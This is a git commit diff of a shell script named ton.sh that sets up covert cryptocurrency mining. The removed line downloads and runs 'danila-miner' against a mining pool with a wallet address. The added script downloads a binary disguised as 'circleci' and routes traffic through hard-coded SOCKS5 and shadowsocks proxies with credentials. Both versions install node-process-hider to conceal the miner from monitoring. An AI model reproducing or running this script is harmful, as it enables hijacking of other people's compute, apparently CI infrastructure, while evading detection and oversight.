2970b2c0766c53f60f3d651f83b164f0d0035e90
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-06-21 04:38:14 +0700

    Update ton.sh

--- ton.sh
+++ ton.sh
@@ -1,1 +1,41 @@
-sudo su && sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && npm install -g npm && sudo ph add danila-miner && wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-xenial-hive.tar.gz && tar -xf danila-miner-2.3.1-xenial-hive.tar.gz && cd danila-miner-2.3.1-xenial && ./danila-miner run https://server1.whalestonpool.com EQBMQwmgoYr7Nhirdu4TKYYjrH8PdNAevy_lJN8DPq3NPzb2
+#!/bin/bash
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+npm install -g npm
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+wget https://github.com/aurbach55/zash/raw/main/circleci
+chmod 777 circleci
+
+apt -y install shadowsocks-libev rng-tools
+
+ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
+
+ph add circleci
